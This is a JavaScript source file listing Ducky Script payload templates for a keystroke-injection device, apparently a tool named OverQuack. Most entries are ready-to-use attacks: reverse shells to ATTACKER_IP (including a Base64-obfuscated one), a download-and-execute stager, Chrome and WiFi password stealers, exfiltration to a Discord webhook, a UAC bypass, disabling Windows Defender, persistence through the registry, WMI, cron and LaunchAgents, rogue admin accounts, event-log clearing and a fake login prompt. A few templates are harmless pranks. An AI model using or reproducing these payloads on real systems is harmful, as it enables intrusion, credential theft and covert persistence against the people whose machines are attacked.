const templatesData = [
  {
    name: 'Basic Windows Info Grab',
    desc: 'Collects system information using systeminfo, ipconfig, tasklist',
    code: dedent(
      `REM Basic Windows Info Grab\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING systeminfo > %TEMP%\\info.txt && ipconfig /all >> %TEMP%\\info.txt && tasklist >> %TEMP%\\info.txt\nENTER\nPRINT Info saved to %%TEMP%%\\info.txt`,
    ),
  },
  {
    name: 'WiFi Password Extractor',
    desc: 'Extracts saved WiFi passwords using netsh profiles',
    code: dedent(
      `REM WiFi Password Extractor\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netsh wlan export profile key=clear folder=%TEMP%\nENTER\nDELAY 500\nSTRING echo Passwords exported to %%TEMP%%\\\nENTER`,
    ),
  },
  {
    name: 'USB Rubber Ducky Test',
    desc: 'Tests basic Ducky Script functionality',
    code: dedent(
      `REM USB Rubber Ducky Test\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 800\nSTRING Hello World from OverQuack!\nENTER\nSTRING This payload tests baseline performance.\nENTER`,
    ),
  },
  {
    name: 'System Reconnaissance (Basic)',
    desc: 'Quick system recon using PowerShell',
    code: dedent(
      `REM System Reconnaissance\nGUI r\nDELAY 500\nSTRING powershell -NoP -W H -Ep Bypass\nENTER\nDELAY 800\nSTRING systeminfo > $env:TEMP\\\\sysinfo.txt\nENTER\nSTRING Get-Process > $env:TEMP\\\\processes.txt\nENTER\nSTRING Get-Service | Where-Object Status -eq 'Running' > $env:TEMP\\\\services.txt\nENTER\nSTRING Get-WmiObject Win32_UserAccount | Select Name, Status > $env:TEMP\\\\users.txt\nENTER\nPRINT Recon data saved to %TEMP%`,
    ),
  },
  {
    name: 'Reverse Shell (PowerShell)',
    desc: 'Establishes reverse shell (TCP)',
    code: dedent(
      `REM PowerShell Reverse Shell\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING $c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$sb=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($sb);$s.Write($sb,0,$sb.Length);$s.Flush()}\nENTER`,
    ),
  },
  {
    name: 'Reverse Shell (Base64 Encoded)',
    desc: 'Obfuscated reverse shell using Base64 encoding',
    code: dedent(
      `REM Base64 Reverse Shell\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING $e='JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiQVRUQUNLRVJfSVAiLDQ0NDQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLDAsJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXskZGF0YSA9IChOZXctT2JqZWN0IFRleHQuQVNJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsJGkpOyRzZW5kYmFjayA9IChpZSBgJGRhdGEgMi0+JjEgfCBPdXQtU3RyaW5nKSAgIDskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgIlBTICIgKyAoZ2V0LWxvY2F0aW9uKS5QYXRoICsgIj4gIjskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgp'\nENTER\nSTRING $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e))\nENTER\nSTRING Invoke-Expression $decoded\nENTER`,
    ),
  },
  {
    name: 'Registry Persistence (Startup)',
    desc: 'Adds payload to Windows Run registry key',
    code: dedent(
      `REM Registry Persistence\nGUI r\nDELAY 500\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OverQuack /t REG_SZ /d "C:\\path\\to\\payload.exe" /f\nENTER\nPRINT Persistence added to HKCU Run`,
    ),
  },
  {
    name: 'Scheduled Task Persistence',
    desc: 'Creates a scheduled task for daily execution at 8 AM',
    code: dedent(
      `REM Scheduled Task Persistence\nGUI r\nDELAY 500\nSTRING powershell -Command "\\$Action = New-ScheduledTaskAction -Execute 'C:\\Windows\\System32\\payload.exe'; \\$Trigger = New-ScheduledTaskTrigger -Daily -At 8AM; \\$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName 'SystemMaintenanceTask' -Action \\$Action -Trigger \\$Trigger -Settings \\$Settings -Force"\nENTER\nPRINT Scheduled task created.`,
    ),
  },
  {
    name: 'File Exfiltration to Discord',
    desc: 'Uploads a specified file to Discord via webhook',
    code: dedent(
      `REM File Exfiltration\nGUI r\nDELAY 500\nSTRING powershell -Command "\\$file = 'C:\\important\\file.txt'; \\$webhook = 'YOUR_DISCORD_WEBHOOK_URL'; curl.exe --insecure -F 'file1=@\\$file' \\$webhook"\nENTER\nPRINT File sent to Discord.`,
    ),
  },
  {
    name: 'Clipboard Stealer',
    desc: 'Grabs clipboard content and saves to a file',
    code: dedent(
      `REM Clipboard Stealer\nGUI r\nDELAY 500\nSTRING powershell -Command "\\$text = Get-Clipboard; \\$text | Out-File $env:TEMP\\clipboard.txt"\nENTER\nPRINT Clipboard saved to %TEMP%\\clipboard.txt`,
    ),
  },
  {
    name: 'Browser Password Stealer (Chrome)',
    desc: 'Extracts saved Chrome passwords using PowerShell',
    code: dedent(
      `REM Chrome Password Stealer\nGUI r\nDELAY 500\nSTRING powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/attacker/Invoke-ChromePassword/master/Invoke-ChromePassword.ps1'); Invoke-ChromePassword | Out-File $env:TEMP\\chrome_passwords.txt"\nENTER\nPRINT Chrome passwords saved to %TEMP%`,
    ),
  },
  {
    name: 'Create New Admin User',
    desc: 'Creates a new local administrator user account',
    code: dedent(
      `REM Create Admin User\nGUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING net user NewAdmin SuperStrongPassword /add\nENTER\nSTRING net localgroup administrators NewAdmin /add\nENTER\nPRINT New admin user created.`,
    ),
  },
  {
    name: 'Disable Windows Defender',
    desc: 'Disables real-time protection in Windows Defender',
    code: dedent(
      `REM Disable Windows Defender\nGUI r\nDELAY 500\nSTRING powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nPRINT Real-time monitoring disabled.`,
    ),
  },
  {
    name: 'System Shutdown (Immediate)',
    desc: 'Forces an immediate system shutdown',
    code: dedent(
      `REM Immediate Shutdown\nGUI r\nDELAY 500\nSTRING shutdown /s /f /t 0\nENTER\nPRINT Shutting down...`,
    ),
  },
  {
    name: 'Screen Capture',
    desc: 'Takes a screenshot and saves it to temp',
    code: dedent(
      `REM Screen Capture\nGUI r\nDELAY 500\nSTRING powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; \\$bitmap = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); \\$graphics = [Drawing.Graphics]::FromImage(\\$bitmap); \\$graphics.CopyFromScreen((\\$point), (\\$point), \\$bitmap.Size); \\$bitmap.Save('$env:TEMP\\screenshot.png')"\nENTER\nPRINT Screenshot saved to %TEMP%\\screenshot.png`,
    ),
  },
  {
    name: 'Fake Windows Login Screen',
    desc: 'Displays a fake Windows login prompt',
    code: dedent(
      `REM Fake Windows Login\nGUI r\nDELAY 500\nSTRING powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Enter your password to unlock this Windows', 'Windows Security', '', -1, -1)"\nENTER\nPRINT Fake login box displayed.`,
    ),
  },
  {
    name: 'Message Spam (Notepad)',
    desc: 'Opens Notepad and spams a message repeatedly',
    code: dedent(
      `REM Message Spam\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING I'm OverQuack!\nENTER\nREPEAT LINES=2 TIMES=10`,
    ),
  },
  {
    name: 'OverQuack Multi-OS Advanced Framework',
    desc: 'Advanced multi-stage execution with variables and logic',
    code: dedent(
      `REM OverQuack Advanced Framework\nDEFINE TARGET_STAGE_DELAY 1200\nDEFINE RUNTIME_SHORT_DELAY 450\nVAR $executionToken = $_RANDOM_NUMBER:6\nPRINT Executing environment optimization...\nSELECT_LAYOUT US\nDEFAULT_DELAY 80\nIF ($_CAPSLOCK_ON == 1)\n    PRINT Caps Lock active - halting.\nELSE\n    PRINT Verified. Loading stage: $executionToken\n    GUI r\n    DELAY TARGET_STAGE_DELAY\n    STRINGLN powershell.exe -WindowStyle Hidden\n    DELAY RUNTIME_SHORT_DELAY\nEND_IF`,
    ),
  },
  {
    name: 'OverQuack Network Profiling',
    desc: 'Gathers network information and saves to a file',
    code: dedent(
      `REM OverQuack Network Profiling\nPRINT Collecting network information...\nSELECT_LAYOUT US\nDEFAULT_DELAY 150\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING ipconfig /all > %TEMP%\\overquack_network.txt\nENTER\nSTRING arp -a >> %TEMP%\\overquack_network.txt\nENTER\nSTRING nslookup google.com >> %TEMP%\\overquack_network.txt\nENTER\nPRINT Network data saved to %%TEMP%%\\overquack_network.txt`,
    ),
  },
  {
    name: 'Blank Template',
    desc: 'Start with an empty payload',
    code: 'REM Start writing your payload here\n',
  },

  {
    name: 'UAC Bypass (Fodhelper)',
    desc: 'Bypasses UAC via Fodhelper registry key',
    code: dedent(
      `REM UAC Bypass - Fodhelper\nGUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd /c start C:\\Windows\\System32\\cmd.exe /c whoami > %TEMP%\\bypass.txt" /f\nENTER\nSTRING reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 0 /f\nENTER\nSTRING fodhelper.exe\nENTER\nDELAY 2000\nPRINT UAC bypassed and command executed.`,
    ),
  },

  {
    name: 'WiFi Profile & Password Exfiltration',
    desc: 'Extracts all saved WiFi passwords and saves to file',
    code: dedent(
      `REM WiFi Password Exfiltration\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netsh wlan show profiles > %TEMP%\\wifi.txt\nENTER\nSTRING for /f "tokens=1,2 delims=:" %%a in ('netsh wlan show profiles^|find "All User Profile"') do netsh wlan show profile name="%%b" key=clear >> %TEMP%\\wifi.txt\nENTER\nPRINT WiFi data saved to %%TEMP%\\wifi.txt`,
    ),
  },
  {
    name: 'Clipboard Monitor & Exfiltrate',
    desc: 'Monitors clipboard for text and saves to file',
    code: dedent(
      `REM Clipboard Monitor\nGUI r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -Command "while($true){$clip=Get-Clipboard;if($clip.Length -gt 5){$clip|Out-File $env:TEMP\\clip_log.txt -Append;Start-Sleep -Seconds 3}}" \nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nPRINT Clipboard monitoring started.`,
    ),
  },
  {
    name: 'File Finder & Exfiltration',
    desc: 'Searches for .docx, .xlsx, .pdf files and saves results to a file',
    code: dedent(
      `REM File Finder\nGUI r\nDELAY 500\nSTRING powershell -Command "Get-ChildItem -Path C:\\Users\\%USERNAME%\\Documents -Recurse -Include *.docx,*.xlsx,*.pdf | Select-Object FullName,Length,LastWriteTime | Export-Csv -Path $env:TEMP\\files.csv -NoTypeInformation"\nENTER\nPRINT File list saved to %%TEMP%%\\files.csv`,
    ),
  },

  {
    name: 'ARP Scanning & Network Mapping',
    desc: 'Runs arp -a to list network devices and saves to file',
    code: dedent(
      `REM Network ARP Scan\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING arp -a > %TEMP%\\arp_scan.txt\nENTER\nPRINT ARP scan saved to %%TEMP%%\\arp_scan.txt`,
    ),
  },
  {
    name: 'Environment Variables Dump',
    desc: 'Dumps all Windows environment variables to a file',
    code: dedent(
      `REM Environment Variables Dump\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING set > %TEMP%\\env_vars.txt\nENTER\nPRINT Environment variables saved to %%TEMP%%\\env_vars.txt`,
    ),
  },
  {
    name: 'Installed Software Inventory',
    desc: 'Lists all installed software using WMIC and saves to file',
    code: dedent(
      `REM Software Inventory\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING wmic product get name,version > %TEMP%\\software.txt\nENTER\nPRINT Software list saved to %%TEMP%%\\software.txt`,
    ),
  },

  {
    name: 'Startup Folder Backdoor',
    desc: 'Copies a payload file to the Windows startup folder',
    code: dedent(
      `REM Startup Folder Backdoor\nGUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING copy C:\\path\\to\\payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe"\nENTER\nPRINT Payload added to startup folder.`,
    ),
  },
  {
    name: 'WMI Persistence',
    desc: 'Creates persistent event filter and consumer in WMI using PowerShell',
    code: dedent(
      `REM WMI Persistence\nGUI r\nDELAY 500\nSTRING powershell -Command "$filterArgs=@{Name='Updater';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''}; $consumerArgs=@{Name='Updater';CommandLineTemplate='C:\\Windows\\System32\\payload.exe'}; $filter=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $filterArgs; $consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $consumerArgs; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{Filter=$filter;Consumer=$consumer}"\nENTER\nPRINT WMI persistence created.`,
    ),
  },

  {
    name: 'Linux: Reverse Shell (Bash)',
    desc: 'Establishes a bash reverse shell (requires listener)',
    code: dedent(
      `REM Linux Bash Reverse Shell\nCTRL ALT t\nDELAY 1000\nSTRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\nENTER\nREM Requires proper formatting for Ducky; adjust as needed.`,
    ),
  },
  {
    name: 'Linux: Scheduled Task Persistence',
    desc: 'Adds a cron job for persistence on Linux',
    code: dedent(
      `REM Linux Cron Persistence\nCTRL ALT t\nDELAY 1000\nSTRING (crontab -l ; echo "@reboot /home/user/payload.sh") | crontab -\nENTER\nPRINT Cron job added.`,
    ),
  },

  {
    name: 'macOS: Reverse Shell (Python)',
    desc: 'Establishes a reverse shell using Python',
    code: dedent(
      `REM macOS Python Reverse Shell\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 800\nSTRING python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\nENTER\nPRINT Reverse shell executed.`,
    ),
  },
  {
    name: 'macOS: LaunchAgent Persistence',
    desc: 'Creates a LaunchAgent plist for user-level persistence',
    code: dedent(
      `REM macOS LaunchAgent Persistence\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 800\nSTRING mkdir -p ~/Library/LaunchAgents\nENTER\nSTRING cp /path/to/payload.sh ~/Library/LaunchAgents/com.user.startup.plist\nENTER\nSTRING launchctl load ~/Library/LaunchAgents/com.user.startup.plist\nENTER\nPRINT LaunchAgent persistence set.`,
    ),
  },

  {
    name: 'Matrix Code Rain',
    desc: 'Opens CMD with a matrix-style falling code effect',
    code: dedent(
      `REM Matrix Code Rain\nGUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING color 0a\nENTER\nSTRING cd %windir%\nENTER\nSTRING dir /s\nENTER\nPRINT Matrix effect started.`,
    ),
  },
  {
    name: 'Mouse Pointer Jiggle Prank',
    desc: 'Jiggles the mouse pointer randomly (background task)',
    code: dedent(
      `REM Mouse Pointer Jiggle Prank\nBACKGROUND_JIGGLE_MOUSE INF 10 0.2\nPRINT Mouse jiggle started in background.`,
    ),
  },
  {
    name: 'Continuous Error Pop-ups',
    desc: 'Triggers endless error pop-ups via PowerShell',
    code: dedent(
      `REM Error Pop-ups\nGUI r\nDELAY 500\nSTRING powershell -Command "while($true){[System.Windows.Forms.MessageBox]::Show('Your system has been compromised!','Critical Error')}"\nENTER\nPRINT Error pop-ups started.`,
    ),
  },

  {
    name: 'Login Script: Dump Wi-Fi Passwords',
    desc: 'Dumps Wi-Fi passwords silently and exits',
    code: dedent(
      `REM Login Script: Wi-Fi Passwords\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netsh wlan export profile key=clear folder=%TEMP%\nENTER\nDELAY 2000\nSTRING taskkill /im cmd.exe /f\nENTER`,
    ),
  },
  {
    name: 'Download and Execute Stager',
    desc: 'Downloads and runs a staged PowerShell payload from a remote URL',
    code: dedent(
      `REM Download and Execute Stager\nGUI r\nDELAY 500\nSTRING powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/launcher.ps1')"\nENTER\nPRINT Payload download and execution attempted.`,
    ),
  },
  {
    name: 'Backup System Information to Drive',
    desc: 'Backs up system files and settings to a USB drive (if mounted)',
    code: dedent(
      `REM System Backup to USB\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING xcopy C:\\Users\\%USERNAME%\\Documents E:\\Backup\\Documents /E /I /Y\nENTER\nSTRING xcopy %APPDATA% E:\\Backup\\AppData /E /I /Y\nENTER\nPRINT Backup copied to E:\\Backup.`,
    ),
  },
  {
    name: 'Silent Chrome Password Dump',
    desc: 'Extracts Chrome saved passwords using a PowerShell script',
    code: dedent(
      `REM Silent Chrome Password Dump\nGUI r\nDELAY 500\nSTRING powershell -Command "Import-Module -Name $env:TEMP\\Invoke-ChromeDump.ps1; Invoke-ChromeDump | Out-File $env:TEMP\\chrome_pass.txt -Encoding utf8"\nENTER\nPRINT Chrome passwords saved to %%TEMP%%\\chrome_pass.txt`,
    ),
  },

  {
    name: 'Add User to Remote Desktop Group',
    desc: 'Adds current user to Remote Desktop Users group',
    code: dedent(
      `REM Add to RDP Group\nGUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING net localgroup "Remote Desktop Users" %USERNAME% /add\nENTER\nPRINT User added to RDP group.`,
    ),
  },
  {
    name: 'Enable Remote Desktop Firewall Rule',
    desc: 'Enables Remote Desktop via firewall rules using PowerShell',
    code: dedent(
      `REM Enable RDP Firewall\nGUI r\nDELAY 500\nSTRING powershell -Command "Set-NetFirewallRule -DisplayGroup 'Remote Desktop' -Enabled True -Direction Inbound"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nPRINT RDP firewall rule enabled.`,
    ),
  },
  {
    name: 'Clear Event Logs (Forensic Cleanup)',
    desc: 'Clears Windows Event Logs using wevtutil',
    code: dedent(
      `REM Clear Event Logs\nGUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING wevtutil el | Foreach-Object {wevtutil cl "$_"}\nENTER\nPRINT Event logs cleared.`,
    ),
  },

  {
    name: 'OverQuack: Wi-Fi Connection Script',
    desc: 'Uses OverQuack variables to connect to a new Wi-Fi network',
    code: dedent(
      `REM OverQuack Wi-Fi Connector\nPRINT Connecting to target Wi-Fi network...\nDEFINE CONNECTION_DELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING netsh wlan connect name="$_SSID"\nENTER\nDELAY CONNECTION_DELAY\nPRINT Connected to $_SSID successfully!`,
    ),
  },
  {
    name: 'OverQuack: Disable System Notifications',
    desc: 'Disables system notifications using PowerShell',
    code: dedent(
      `REM Disable System Notifications\nGUI r\nDELAY 500\nSTRING powershell -Command "New-Item -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings -Force; Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -Type DWord -Value 0 -Force"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nPRINT Notifications disabled.`,
    ),
  },
  {
    name: 'OverQuack: Self-Delete Payload',
    desc: 'Deletes the payload file after execution',
    code: dedent(
      `REM Self-Delete Payload\nPRINT Deleting payload after execution...\nGUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING del %~f0\nENTER\nPRINT Payload deleted.`,
    ),
  },

  {
    name: 'Keyboard Layout Changer (US)',
    desc: 'Sets the keyboard layout to US using Ducky command',
    code: dedent(
      `REM Change Keyboard Layout\nSELECT_LAYOUT US\nPRINT Keyboard layout changed to US.`,
    ),
  },
  {
    name: 'System Restore Point Creator',
    desc: 'Creates a system restore point using PowerShell',
    code: dedent(
      `REM Restore Point Creation\nGUI r\nDELAY 500\nSTRING powershell -Command "Checkpoint-Computer -Description 'OverQuackRestorePoint' -RestorePointType MODIFY_SETTINGS"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nPRINT Restore point created.`,
    ),
  },
  {
    name: 'Volume Control: Mute System',
    desc: 'Mutes the system volume via Ducky consumer keys',
    code: dedent(`REM Mute System Volume\nMK_MUTE\nPRINT System muted.`),
  },
];
